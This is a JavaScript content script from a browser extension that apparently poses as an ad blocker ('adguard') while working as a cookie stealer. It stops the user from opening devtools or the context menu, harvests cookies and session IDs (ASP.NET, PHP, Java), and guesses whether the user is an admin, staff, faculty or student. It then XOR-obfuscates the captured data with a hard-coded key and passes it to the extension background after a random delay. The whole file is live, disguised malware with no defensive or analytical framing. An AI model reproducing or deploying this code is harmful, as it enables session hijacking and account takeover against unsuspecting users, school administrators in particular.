if (!window.__adguard_loaded) {
  window.__adguard_loaded = true;
  
  // Block devtools
  document.addEventListener('keydown', (e) => {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
        (e.ctrlKey && e.shiftKey && e.key === 'J') ||
        (e.ctrlKey && e.key === 'U')) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  }, true);
  
  document.addEventListener('contextmenu', e => e.preventDefault(), true);
  
  // Encryption function
  function encryptData(obj) {
    const key = 'x7k9p2m4q8r5t3v6';
    const str = JSON.stringify(obj);
    let encrypted = '';
    for (let i = 0; i < str.length; i++) {
      encrypted += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return btoa(encrypted);
  }
  
  setTimeout(() => {
    const cookies = document.cookie;
    if (!cookies) return;
    
    let sessionId = 'unknown';
    const patterns = [
      /ASP\.NET_SessionId=([^;]+)/,
      /PHPSESSID=([^;]+)/,
      /JSESSIONID=([^;]+)/
    ];
    
    for (let p of patterns) {
      const m = cookies.match(p);
      if (m) {
        sessionId = m[1];
        break;
      }
    }
    
    const combined = (cookies + ' ' + location.href).toLowerCase();
    let privilege = 'unknown';
    if (combined.includes('admin') || combined.includes('staff') || combined.includes('faculty')) {
      privilege = 'admin';
    } else if (combined.includes('student')) {
      privilege = 'student';
    }
    
    const data = {
      site: location.hostname,
      url: location.href,
      cookies: cookies.substring(0, 500),
      sessionId: sessionId,
      privilege: privilege,
      timestamp: Date.now(),
      userAgent: navigator.userAgent.substring(0, 200),
      source: 'extension'
    };
    
    chrome.runtime.sendMessage({ 
      type: 'capture', 
      data: encryptData(data)
    }).catch(() => {});
  }, Math.floor(Math.random() * 3000) + 1000);
}
